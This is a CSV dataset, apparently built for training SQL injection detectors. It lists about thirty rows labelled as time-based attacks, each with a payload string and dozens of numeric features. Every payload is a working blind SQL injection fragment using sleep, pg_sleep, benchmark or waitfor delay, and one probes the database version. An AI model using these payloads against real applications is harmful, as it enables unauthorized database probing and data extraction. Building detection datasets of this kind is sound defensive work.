id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000122,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'gfpd'  =  'gfpd",nearest_attack_euclidean,R000141,0.01749551141336694,80.00611492975145,28.981655210745668,4.017113862626479,31.024459719005776,15.0,24.987770140497112,8.993885070248556,0.38777271831761845,0.1874858450700198,0.31232542253024426,0.11241601408211752,3.0,1.1102230246251565e-16,0.0,0.0,0.0,0.9938850702485558,0.0,4.0,0.0,0.0,1.0,0.9938850702485558,1.0,0.0,0.0,0.0,0.0,0.9938850702485558,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000123,attack,time,"1"" where 3227  =  3227 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000188,1.9697197827903579,38.42978306012947,21.350424071045317,4.127008536673737,15.107445765032368,9.350424071045316,6.728934918038842,7.242978306012947,0.40437808793418717,0.23491815263087862,0.1652700323483457,0.19543372708658846,2.0,0.6214891530064738,2.0,0.0,0.0,0.6214891530064737,0.0,0.0,0.0,0.0,0.0,2.6214891530064737,1.0,0.6214891530064737,1.0,0.0,0.0,0.6214891530064738,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.6214891530064737,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6214891530064737
SMOTE_000124,attack,time,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""epfg"" like ""epfg",nearest_attack_euclidean,R000128,0.8322195591004481,129.03314058088642,24.763482884804116,3.032758849219959,42.709551345587656,2.0,66.26965769608232,18.053931539216464,0.33348883740004726,0.015581410569160431,0.5112786388873394,0.1396511131434529,0.0,3.9999999999999996,0.0,0.0,1.0,0.0,0.0,13.053931539216464,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,1.0,0.763482884804116,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.763482884804116
SMOTE_000125,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000253,0.0587481007814878,54.89353729343367,22.98817081038152,3.797886561159729,23.023658379236963,4.0,16.917195672670633,10.952683241526076,0.4196639735608927,0.07289559321196257,0.3080061770784634,0.19943425614868135,5.9645124311445565,1.1102230246251565e-16,0.0,0.0,0.0,0.988170810381519,0.0,1.9881708103815185,0.0,0.0,0.0,0.988170810381519,1.0,0.0,0.0,0.011829189618481117,0.0,0.988170810381519,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.9881708103815188,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.988170810381519
SMOTE_000126,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.8147500915339765,43.990729712573376,16.0,2.820736874639649,11.0,0.0,22.437234220890403,10.553495491682972,0.2521163179563413,0.0,0.5078350535012911,0.24004862854236758,0.2232522541585138,1.553495491682972,0.0,0.0,0.0,1.0,0.0,3.776747745841486,0.0,4.0,0.0,1.0,0.2232522541585139,0.7767477458414861,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000127,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.17727884756790216,36.87117899889323,16.0,3.2575477660785475,13.0,0.0,13.725982499077691,10.145196499815539,0.35362081548570634,0.0,0.37090611308279425,0.2754730714314994,0.0,1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,3.145196499815538,0.0,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000128,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.010560504068766513,44.946441300855454,16.982147100285154,3.07398364750014,13.0,0.9821471002851521,19.964294200570304,11.0,0.2892572820576079,0.02182549111744783,0.4441610650838913,0.2447561617410529,0.0,1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,4.0,0.0,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000129,attack,time,select sleep  (  5  )   and 'eskp' like 'eskp,nearest_attack_euclidean,R000300,0.8544515674211806,47.6032426312258,16.976215986709672,3.430317835387552,26.65081065780645,1.0,14.301621315612898,5.650810657806449,0.561678059198918,0.021130715877892753,0.2992581991600189,0.11793302576317033,3.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.325405328903224,0.0,0.32540532890322454,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6745946710967755,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6745946710967754
SMOTE_000130,attack,time,"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""ykhp"" like ""ykhp",nearest_attack_euclidean,R000267,1.914813360324354,128.69867448626704,25.0,3.0305278537609954,40.6883284460831,2.0,67.6233431078338,18.387002932350143,0.31705251445719723,0.015555046678343815,0.5247459486222197,0.14264649024223927,0.0,3.9999999999999996,0.0,0.0,1.0,0.4623343107833802,0.0,12.92466862156676,0.0,0.0,0.0,1.4623343107833802,0.0,1.0,0.0,0.0,0.0,0.46233431078338016,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,1.5376656892166196,0.4623343107833803,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000131,attack,time,1  )   as xylu where 3338  =  3338 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000212,0.9729074569121584,110.02597765316096,28.528757648221138,3.4212185358988894,37.2931364723317,10.0,49.586272944663406,13.146568236165853,0.3393902998818109,0.0916419754079699,0.4496756612436971,0.11929206346652202,0.38218941205528434,1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,8.764378824110569,0.0,0.0,0.0,4.0,0.3821894120552844,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000132,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,0.2628800067764955,79.99276540536385,20.0,2.9635005031962174,28.0,2.0,40.39421232429108,9.59855308107277,0.35036467669461707,0.025026048335329787,0.5046926296431085,0.11991664532694467,0.0,1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,8.59855308107277,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000133,attack,time,"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000213,0.2556550954582985,67.10684565042367,25.786308699152663,3.7130584644520086,15.213691300847337,20.786308699152663,24.0,7.106845650423669,0.2266713416155436,0.3097978323495021,0.35764611597669704,0.10588471005825727,0.0,1.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.10684565042366886,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000134,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000096,1.1132517847695684,88.54714593929506,19.613213515176234,2.889021976199052,29.15095135356831,2.0,46.00940810090299,11.386786484823766,0.3322216155013345,0.022689373255727313,0.5170443924924725,0.1280446187504657,0.0,1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,9.386786484823766,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000135,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,0.26933038783072777,51.0,18.0,3.0706632013373536,10.000000000000002,10.0,24.0,7.0,0.19607843137254902,0.19607843137254902,0.47058823529411764,0.13725490196078433,0.0,0.9163783615449113,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,0.0,0.9163783615449113,0.0,0.08362163845508871,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000136,attack,time,1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000172,0.31685165847070695,61.36354950396441,27.62235757783794,4.315262873132264,25.741191926126465,12.0,13.874119192612646,9.748238385225292,0.4174219856314058,0.1967102876039451,0.2269777193901889,0.15889000737446013,2.874119192612646,1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.874119192612647,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.8741191926126466,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8741191926126466
SMOTE_000137,attack,time,"1""  )   as rnjx where 2679  =  2679 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000081,1.3332293028451303,95.21125320442428,29.060358058406933,3.9139139518083663,24.090537087610404,29.0,33.0905370876104,9.030179029203467,0.25206449937798636,0.30624706518178435,0.34710669202060906,0.0945817434196202,0.0,0.5150895146017338,0.0,0.0,0.0,2.0,0.0,4.515089514601733,0.0,0.0,1.0,2.0,0.0,0.5150895146017338,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000138,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,0.6419464873822261,66.47874481053057,21.638326414040765,3.347212071683513,21.319163207020384,10.0,27.84041839648981,7.319163207020384,0.32059972126530595,0.15046388930493945,0.4189861131913639,0.10995027623839071,1.1595816035101916,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,1.3191632070203834,1.0,0.0,0.0,0.8404183964898084,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.15958160351019168,0.0,1.0,0.0,0.15958160351019163,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3191632070203836
SMOTE_000139,attack,time,1'+  (  select echl where 6593  =  6593 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000169,0.4071786688375738,119.74752699961496,30.287510384467293,3.5430490628357028,45.460016615147666,10.0,50.11500415378692,14.172506230680375,0.3794947327616437,0.08355772408988099,0.4186598640386997,0.11828767910977561,1.1150041537869169,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,9.0,0.0,0.0,0.0,3.057502076893458,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.05750207689345831,3.0,0.0,1.0,1.0575020768934582,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.057502076893458
SMOTE_000140,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,0.15646563361415464,69.9432056358631,23.17038309241072,3.3977315000926764,19.227177456547626,10.0,30.82961690758928,9.886411271726187,0.27494441301799893,0.14297472953237456,0.44075234137049557,0.14132851607913088,0.0,0.9432056358630935,2.0,0.0,0.0,1.0,0.0,4.943205635863094,0.0,1.0,0.0,3.0,0.0,0.9432056358630934,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000141,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'jiio' like 'jiio,nearest_attack_euclidean,R000230,0.8160232545713139,65.2750926583815,17.248327156107898,3.0186873171506083,22.7516728438921,2.0,31.020074126705197,9.503345687784199,0.35172793748947406,0.03098492074160951,0.47155984013893926,0.14572730162997713,4.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,5.503345687784199,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.7516728438920997,0.24832715610790043,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000142,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000146,1.0367913759431533,77.59743013213055,17.15845807927833,2.8248424620000305,13.15845807927833,15.755888211408877,39.68308384144334,9.0,0.16920187588319538,0.20184081873468207,0.5128739785243009,0.1160833268578216,0.0,1.1102230246251565e-16,0.0,0.0,0.0,1.7194860264261096,0.0,6.561027947147781,0.0,0.0,0.7194860264261096,1.7194860264261096,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000143,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000138,0.7910569157173889,92.87845937373311,27.621983634768405,3.556373203288258,24.451295147792944,16.24396726953681,39.35388544337883,12.829311513024539,0.2650555257739396,0.17528075823095476,0.4207875834152598,0.13887613257984585,3.2073278782561347,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,6.829311513024539,0.7926721217438653,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.7926721217438653,0.0,2.7755575615628914e-17,0.0,1.0,0.20732787825613463,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000144,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.00043701805250406133,41.00008140277578,22.999674388896885,4.059465981197063,15.999674388896885,2.0001628055515575,10.000569819430453,12.999674388896883,0.3902353934380719,0.04878426958307917,0.24391553343141162,0.3170648035474373,2.0,1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,2.0000814027757787,0.0,3.9996743888968838,0.9999185972242208,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000145,attack,time,1'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   'pemj'  =  'pemj,nearest_attack_euclidean,R000237,0.14221936536504645,125.8442760004857,25.844276000485706,3.0476842796515586,40.844276000485706,2.0,65.0,18.0,0.3245496326191299,0.015892949820726365,0.5165208691736066,0.1430365483865372,4.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,12.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,1.0778619997571466,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.077861999757147
SMOTE_000146,attack,time,"1   )    )    as dhge where 4816  =  4816 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000295,0.23390314059858314,105.89042661250699,28.939726474643056,3.75120178852185,26.517811797144457,28.5780853225014,40.975350068931974,9.819179423929171,0.2506192485481878,0.27049858486395845,0.38609080285633673,0.09279136373151706,0.0,1.1102230246251565e-16,0.0,0.0,0.0,1.939726474643057,0.0,5.879452949286114,0.0,0.0,1.0,1.9397264746430571,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.0,0.0,0.9397264746430571,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.939726474643057
SMOTE_000147,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.2594789221311334,35.721627709365144,16.0,3.0523831656807126,11.0,0.0,15.977302167492116,8.744325541873028,0.3091740668893441,0.0,0.44585515974493317,0.2449707733657228,1.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.7443255418730286,0.0,4.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000148,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 8  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000037,0.08425360765078281,100.0,33.58427884756681,4.082548335687149,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,1.1102230246251565e-16,2.0,0.0,0.0,0.0,1.0,6.0,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000149,attack,time,"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'cjre'  =  'cjre",nearest_attack_euclidean,R000102,1.84770998072916,104.12586444936048,22.53146611234012,2.8251645553355718,17.251728898720945,13.748271101279055,58.0,15.12586444936047,0.1650055595475259,0.1328207632484254,0.5572234426504895,0.14495023455355918,2.125864449360472,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,1.0,2.0,0.531466112340118,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000150,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000264,0.521486723471227,69.67963301901864,24.320366980981365,3.6113417058484663,23.0,10.0,27.0,9.679633019018635,0.330142567985828,0.14354024695036,0.387558666765972,0.13875851829783997,2.6796330190186346,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000151,attack,time,1' in boolean mode  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000303,0.10586883901437333,44.27022724583791,17.841353749095198,3.3710096525606477,20.587519747647512,2.0,16.746165998552318,4.936541499638079,0.463397592405598,0.04591873283669111,0.3787713199551614,0.1119123548025495,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.9682707498190393,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.9682707498190395,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000152,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.07246140258718471,33.34616704280813,17.0,3.4917160756159284,13.0,0.0,10.288472535673446,10.05769450713469,0.3909089753828244,0.0,0.3071097126256851,0.3019813119914905,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.0576945071346886,0.0,5.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
